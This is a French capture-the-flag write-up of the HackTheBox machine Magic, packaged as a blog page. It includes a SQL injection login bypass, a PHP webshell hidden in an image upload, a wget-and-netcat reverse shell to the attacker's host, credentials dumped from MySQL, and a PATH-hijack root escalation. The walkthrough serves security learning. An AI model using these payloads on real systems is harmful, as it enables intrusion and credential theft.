@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    
+      <title>Magic :: RedFou52 - BlogPost — Bienvenue sur mon BlogPost</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Hello, bienvenue sur mon Write-Up de la machine Magic , ma première box medium !
+C&amp;rsquo;est une box très intéressante et assez réaliste !
+Bonne lecture !
+ Tools  Kali linux 2020 &#43; Tous les outils ZSH pour le shell Virtualbox pour la machine Kali  NMAP On commence par un nmap pour voir les ports ouvert et commencer notre énumération.
+~ ヤマト» sudo nmap -v -sS -A -Pn -T5 10."/>
+<meta name="keywords" content="linux, tuto, programmation, python"/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/writeup/magic/" />
+
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Magic"/>
+<meta name="twitter:description" content="HackTheBox : Magic"/>
+
+
+
+<meta property="og:title" content="Magic" />
+<meta property="og:description" content="HackTheBox : Magic" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/writeup/magic/" />
+<meta property="article:published_time" content="2020-08-03T16:01:32+02:00" />
+<meta property="article:modified_time" content="2020-08-03T16:01:32+02:00" /><meta property="og:site_name" content="RedFou52 - BlogPost" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">RedFou52 - BlogPost</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+
+
+
+    <span class="header__right">
+      
+        <nav class="menu">
+	<ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+	<li><a href="/tuto">Les Tutos</a></li>
+        
+      
+        
+	<li><a href="/secu">Sécurité</a></li>
+        
+      
+        
+	<li><a href="/writeup">Write-Up</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">
+            Autres catégories
+            <span class="menu__sub-inner-more-trigger-icon"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+          </li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+	      <li><a href="/binary">Exploit-Binaire</a></li>
+              
+            
+              
+	      <li><a href="/raspberry">Raspberry</a></li>
+              
+            
+              
+	      <li><a href="/nixos">NIXOS</a></li>
+              
+            
+              
+	      <li><a href="/arch">Archlinux</a></li>
+              
+            
+              
+	      <li><a href="/ml">MachineLearning</a></li>
+              
+            
+              
+	      <li><a href="/about">A propos !</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/tuto">Les Tutos</a></li>
+      
+    
+      
+        <li><a href="/secu">Sécurité</a></li>
+      
+    
+      
+        <li><a href="/writeup">Write-Up</a></li>
+      
+    
+      
+        <li><a href="/binary">Exploit-Binaire</a></li>
+      
+    
+      
+        <li><a href="/raspberry">Raspberry</a></li>
+      
+    
+      
+        <li><a href="/nixos">NIXOS</a></li>
+      
+    
+      
+        <li><a href="/arch">Archlinux</a></li>
+      
+    
+      
+        <li><a href="/ml">MachineLearning</a></li>
+      
+    
+      
+        <li><a href="/about">A propos !</a></li>
+      
+    
+  </ul>
+</nav>
+
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="/writeup/magic/">Magic</a></h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          03-08-2020
+        </span>
+
+        
+      
+
+      <span class="post-author">— Ecrit par Eidorian</span>
+      
+        <span class="post-read-time">— 5 Minutes</span>
+      
+    </div>
+
+    
+
+    
+      
+        <img src="/img/fr/writeup/magic/htb-magic.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      
+        <h2>Table of Contents</h2>
+        <aside class="table-of-contents"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#tools">Tools</a></li>
+    <li><a href="#nmap">NMAP</a></li>
+    <li><a href="#site-web">Site Web</a></li>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#changement-de-webshell">Changement de webshell</a></li>
+    <li><a href="#road-to-user">Road to USER</a></li>
+    <li><a href="#road-to-root">Road to ROOT</a></li>
+    <li><a href="#suid">SUID</a></li>
+    <li><a href="#cve-">CVE ?</a></li>
+    <li><a href="#path-exploit">PATH exploit</a></li>
+  </ul>
+</nav></aside>
+      
+      <p><img src="/img/fr/writeup/magic/magic.png" alt="Magic"></p>
+<p>Hello, bienvenue sur mon Write-Up de la machine Magic , ma première box medium !</p>
+<p>C&rsquo;est une box très intéressante et assez réaliste !</p>
+<p>Bonne lecture !</p>
+<hr>
+<h2 id="tools">Tools</h2>
+<ul>
+<li>Kali linux 2020 + Tous les outils</li>
+<li>ZSH pour le shell</li>
+<li>Virtualbox pour la machine Kali</li>
+</ul>
+<h2 id="nmap">NMAP</h2>
+<p>On commence par un <code>nmap</code> pour voir les ports ouvert et commencer notre énumération.</p>
+<p><code>~ ヤマト» sudo nmap -v -sS -A -Pn -T5  10.10.10.185</code></p>
+<p><img src="/img/fr/writeup/magic/nmap.png" alt="NMAP"></p>
+<ul>
+<li>Port 22 ouvert, OpenSSH 7.6p1 &ndash;&gt; il y aura surement moyen d&rsquo;avoir un accès SSH</li>
+<li>Port 80 Ouvert, Apache/2.4.29</li>
+</ul>
+<h2 id="site-web">Site Web</h2>
+<p>Pour le site web il s&rsquo;agit d&rsquo;un portfolio d&rsquo;images.
+Une page de <strong>login</strong> est accessible à cette adresse : <code>http://10.10.10.185/login.php</code></p>
+<p>Contournement de l&rsquo;authetification très simple grace à une <strong>injection SQL</strong></p>
+<ul>
+<li>login : <code>admin' OR 1 = 1;</code></li>
+<li>pass : <code>admin' OR 1 = 1;</code></li>
+</ul>
+<p><img src="/img/fr/writeup/magic/upload.png" alt="upload"></p>
+<p>Nous avons maintenant accès à la page <code>upload.php</code> qui nous permet d&rsquo;upload une image dans la galerie. On va tester ça avec une simple image.</p>
+<p>Notre image ce trouve à l&rsquo;adresse suivante : <code>http://10.10.10.185/images/uploads/luffy.png</code></p>
+<p>Maintenant, essayons en changeant l&rsquo;extension par <code>luffy.php.png</code>.</p>
+<p><img src="/img/fr/writeup/magic/php_png.png" alt="php_png"></p>
+<p>Il est donc possible d&rsquo;upload des image en <code>php.png</code> sans contrainte et ensuite de les afficher, maintenant essayons en y ajoutant un webshell php.</p>
+<p><a href="https://github.com/artyuum/Simple-PHP-Web-Shell/blob/master/index.php">https://github.com/artyuum/Simple-PHP-Web-Shell/blob/master/index.php</a></p>
+<p>BON ca ne fonctionne pas très bien avec seulement du PHP.</p>
+<p><img src="/img/fr/writeup/magic/erro.png" alt="Erro"></p>
+<p>Je pense qu&rsquo;il y a une lecture du fichier et si un caractère du style &ldquo;&lt;&rdquo; se trouve dans le fichier, il y a une exeption.</p>
+<p>J&rsquo;ai pu faire un test avec un simple fichier <code>hello.php.png</code> qui contient seulement <code>&lt;H1&gt;Hello&lt;/H1&gt;</code> celui-ci retourne la même erreur.</p>
+<p>Et si je mettais mon code PHP à la fin de mon image ?</p>
+<p>Effectivement, ca fonctionne en laissant l&rsquo;image comme elle est et en ajoutant notre webshell à la fin.</p>
+<p><a href="https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985">Un autre webshell que j&rsquo;utilise ICI</a></p>
+<p><img src="/img/fr/writeup/magic/webshell.png" alt="webshell"></p>
+<h2 id="enumeration">Enumeration</h2>
+<pre><code class="language-bash/shell" data-lang="bash/shell">$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre><p>Maintenant que j&rsquo;ai un accès à la machine, il faut commencer l&rsquo;énumération pour avoir un accès <strong>ROOT</strong>.</p>
+<p><strong>db.php5</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">getMessage</span>());
+            }
+        }
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">self</span><span style="color:#f92672">::</span>$cont;
+    }
+
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">disconnect</span>()
+    {
+        <span style="color:#a6e22e">self</span><span style="color:#f92672">::</span>$cont <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+    }
+}
+</code></pre></div><p>Un fichier assez étrange.</p>
+<p><strong>upload.php</strong>
+<img src="/img/fr/writeup/magic/upload_php.png" alt="upload_php">
+Comme je le disais, on peut voir ici le check sur les caractères &ldquo;&lt;&rdquo;.</p>
+<p><strong>login.php</strong>
+<img src="/img/fr/writeup/magic/login_php.png" alt="login_php"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ls /home
+theseus
+</code></pre></div><p>Il y a un utilisateur, <strong>theseus</strong>.</p>
+<p><strong>.htaccess</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">SetHandler application/x-httpd-php
+
+
+   order deny,allow
+   deny from all
+</code></pre></div><p>Un fichier <code>.htaccess</code> mais qui ne nous apprends rien.</p>
+<h2 id="changement-de-webshell">Changement de webshell</h2>
+<p>Ok après réflexion, j&rsquo;ai changé de webshell et le résultat est beaucoup mieux , j&rsquo;ai repris le premier webshell.</p>
+<p><img src="/img/fr/writeup/magic/db_php5.png" alt="db_php5">
+Je peux maintenant voir le fichier <strong>db.php5</strong> en entier.</p>
+<p>Et on y vois des choses très intéressantes !</p>
+<p>J&rsquo;ai un login et un mdp :</p>
+<ul>
+<li>login : <code>theseus</code></li>
+<li>mdp : <code>iamkingtheseus</code><br>
+SSH ne fonctionne pas, problème de clé publique.</li>
+</ul>
+<h2 id="road-to-user">Road to USER</h2>
+<p>Bon, je vais essayé d&rsquo;avoir un meilleur shell en utilisant <code>nc</code>.</p>
+<p>J&rsquo;ai fait une copie du binaire dans un dossier puis j&rsquo;ai ensuite démarrer un serveur python pour pouvoir y accéder à distance.</p>
+<p><code>wget http://10.10.14.7/nc -P /tmp/ &amp;&amp; chmod +x /tmp/nc &amp;&amp; /tmp/./nc 10.10.14.7 8888 -e /bin/bash</code></p>
+<p>Malheureusement cette commande ne fonctionne pas dans le webshell, je vais essayé de la faire executer dans une image comme le webshell.</p>
+<p>J&rsquo;ai refais un <code>luffy.php.png</code> avec à la fin <code>&lt;?php system(&quot;wget http://10.10.14.7:8000/nc &amp;&amp; chmod +x nc &amp;&amp; ./nc 10.10.14.7 8888 -e /bin/bash&quot;); ?&gt;</code></p>
+<p><img src="/img/fr/writeup/magic/nc.png" alt="nc"></p>
+<p>Bien !</p>
+<p>On fait spawn un <code>/bin/bash</code> avec <code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p>
+<p>On peut voir qu&rsquo;une base de donnée <strong>mysql</strong> est utilisée, mais que le binaire <strong>mysql</strong> n&rsquo;existe pas.</p>
+<p><img src="/img/fr/writeup/magic/mysql.png" alt="mysql"></p>
+<p>En faisant un <code>ls /usr/bin/mysql*</code> on peut voir d&rsquo;autre binaire mysql.</p>
+<p>Un petit tuto <a href="https://www.geek-directeur-technique.com/2017/07/17/utilisation-de-mysqldump">ICI</a> pour utiliser  <code>mysqldump</code>.</p>
+<p>Je me suis intéréssé à ce binaire car je cherche ç faire un dump de la base de donnée avec les creds que j&rsquo;ai trouvé dans <code>db.php5</code>.</p>
+<p>Avec la commande : <code>mysqldump -u theseus -p Magic &gt; /tmp/base.sql</code></p>
+<p>On peut récupérer la base de donnée <strong>base.sql</strong> dans <code>/tmp</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"> <span style="color:#75715e">/*!40000 ALTER TABLE `login` DISABLE KEYS */</span>;
+<span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> <span style="color:#f92672">`</span>login<span style="color:#f92672">`</span> <span style="color:#66d9ef">VALUES</span> (<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#39;admin&#39;</span>,<span style="color:#e6db74">&#39;Th3s3usW4sK1ng&#39;</span>);
+</code></pre></div><p>Nous avoila avec un autre mot de passe, on va tout de suite l&rsquo;utiliser avec le compte <strong>theseus</strong> !</p>
+<p><img src="/img/fr/writeup/magic/theseus.png" alt="theseus"></p>
+<p>Et nous voila USER !</p>
+<p>J&rsquo;en ai profité pour mettre ma clé publique SSH dans le fichier <code>.ssh/autorized_keys</code> afin d&rsquo;avoir un accés SSH à tout moment.</p>
+<h2 id="road-to-root">Road to ROOT</h2>
+<p>On va refaire une énumération mais cette fois en utilisant <a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">LinEnum</a></p>
+<p>A première vue, rien ne me saute au yeux dans le rapport <strong>linenum</strong>.</p>
+<h2 id="suid">SUID</h2>
+<p>Après avoir quelques heures d&rsquo;énumération, je décide de regarder les binaire exploitable avec la commande <code> find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \;</code></p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">-rwsr-xr-x 1 root root 26696 Jan  8  2020 /bin/umount
+-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
+-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
+-rwsr-xr-x 1 root root 43088 Jan  8  2020 /bin/mount
+-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
+-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
+</code></pre><p>Je tombe sur le même résultat que linenum mais cette fois-ci , ca me saute au yeux !
+Le binaire <code>/bin/sysinfo</code> appartient aussi au groupe <strong>users</strong> mais est executé par le compte <strong>root</strong> !</p>
+<p>De plus ce binaire peut-être executé par notre compte <strong>user</strong> !</p>
+<h2 id="cve-">CVE ?</h2>
+<p>On regarde les CVE sur le binaire <code>sysinfo</code>.</p>
+<p>Je tombe sur cette CVE :</p>
+<ul>
+<li><a href="https://www.cvedetails.com/cve/CVE-2017-6516/">https://www.cvedetails.com/cve/CVE-2017-6516/</a></li>
+<li><a href="https://www.exploit-db.com/exploits/44150">https://www.exploit-db.com/exploits/44150</a></li>
+</ul>
+<p>Mais après quelques tentatives, j&rsquo;ai abandonné l&rsquo;idée d&rsquo;utiliser une CVE.</p>
+<h2 id="path-exploit">PATH exploit</h2>
+<p>En regardant de plus près, le binaire <code>sysinfo</code> executer une commande familière.</p>
+<p><img src="/img/fr/writeup/magic/free.png" alt="free"></p>
+<p>L&rsquo;output ressemble beaucoup à la commande <code>free</code>.</p>
+<p>L&rsquo;idée serait de faire executer une fausse commande <code>free</code> à <code>sysinfo</code> afin de faire executer une commande au compte <strong>root</strong>.</p>
+<p><strong>Création de l&rsquo;exploit</strong>
+<img src="/img/fr/writeup/magic/exploit_free.png" alt="exploit_free"></p>
+<p><strong>Modification du PATH</strong>
+<img src="/img/fr/writeup/magic/path_free.png" alt="path_free">
+Il faut mettre le <code>/tmp</code> au début du <strong>PATH</strong> comme ça c&rsquo;est ici que le système va cherche des binaires en premier.</p>
+<p><img src="/img/fr/writeup/magic/nc_root.png" alt="nc_root"></p>
+<p>BINGO nous voila avec un accès <strong>ROOT</strong> !</p>
+
+    </div>
+    
+
+
+    
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">@RedFou52 - Eidorian - 2020</div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
